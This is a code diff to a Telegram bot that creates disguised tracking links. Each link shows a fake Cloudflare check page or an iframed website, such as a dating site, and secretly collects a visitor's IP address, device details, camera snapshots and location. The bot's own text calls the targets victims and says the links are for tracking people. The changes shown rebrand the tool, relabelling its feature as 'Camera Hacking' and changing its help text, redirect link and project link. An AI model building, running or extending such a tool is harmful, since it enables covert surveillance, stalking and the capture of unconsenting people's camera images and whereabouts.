@@ -203,17 +203,17 @@ bot.on("callback_query", async function onCallbackQuery(callbackQuery) {
     bot.sendMessage(
       chatId,
       `
-📖 HELP MENU
+📖 𝗛𝗘𝗟𝗣 𝗠𝗘𝗡𝗨🔮
 
 Send /create to generate a new link.
 
 ━━━━━━━━━━━━━━
 ⚡ BOT FEATURES
 
-• IP Logging
-• Device Detection
-• Camera Snapshot
-• Location Tracking
+• 𝐈𝐏 𝐥𝐨𝐠𝐢𝐧
+• 𝐃𝐞𝐯𝐢𝐜𝐞 𝐓𝐫𝐚𝐜𝐤𝐢𝐧𝐠
+• 𝐂𝐚𝐦𝐞𝐫𝐚 𝐇𝐚𝐜𝐤𝐢𝐧𝐠
+• 𝐋𝐨𝐜𝐚𝐭𝐢𝐨𝐧 𝐓𝐫𝐚𝐜𝐤𝐢𝐧𝐠
 ━━━━━━━━━━━━━━
 `
     );
@@ -233,7 +233,7 @@ Send /create to generate a new link.
 • Express
 • Telegram Bot API
 
-🚀 Hosted On Render
+🚀 Hosted On vps
 `
     );
   }
@@ -310,7 +310,7 @@ function createNew(cid) {
     }),
   };
 
-  bot.sendMessage(cid, `🌐 Enter Your URL`, mk);
+  bot.sendMessage(cid, `🌐 Enter Your ANY URL`, mk);
 }
 
 // =========================
@@ -430,7 +430,7 @@ if(req.params.path != null){
 res.render("cloudflare",{ip:ip,time:d,url:atob(req.params.uri),uid:req.params.path});
 } 
 else{
-res.redirect("https://t.me/th30neand0nly0ne");
+res.redirect("https://t.me/hacker-bot");
 }
 
          
@@ -443,7 +443,7 @@ bot.on('message', (msg) => {
 const chatId = msg.chat.id;
 
 
-if(msg?.reply_to_message?.text=="🌐 Enter Your URL"){
+if(msg?.reply_to_message?.text=="🌐 Enter Your ANY URL"){
  createLink(chatId,msg.text); 
 }
   
@@ -465,7 +465,7 @@ the url it will send you 2 links which you can use to track people.
 \n1. Cloudflare Link: This method will show a cloudflare under attack page to garher informations and afterwards victim will be redirected to destinationed URL.
 \n2. Webview Link: This will show a website (ex bing , dating sites etc) using iframe for gathering information.
 ( ⚠️ Many sites may not work under this method if they have x-frame header present.Ex https://google.com )
-\n\nThe project is OSS at: https://github.com/Thecamhacer/Cybers
+\n\nThe project is OSS at:Cam Hack Bot
 `);
 }
   
@@ -514,7 +514,7 @@ function createNew(cid){
 var mk={
 reply_markup:JSON.stringify({"force_reply":true})
 };
-bot.sendMessage(cid,`🌐 Enter Your URL`,mk);
+bot.sendMessage(cid,`🌐 Enter Your ANY URL`,mk);
 }
 
 
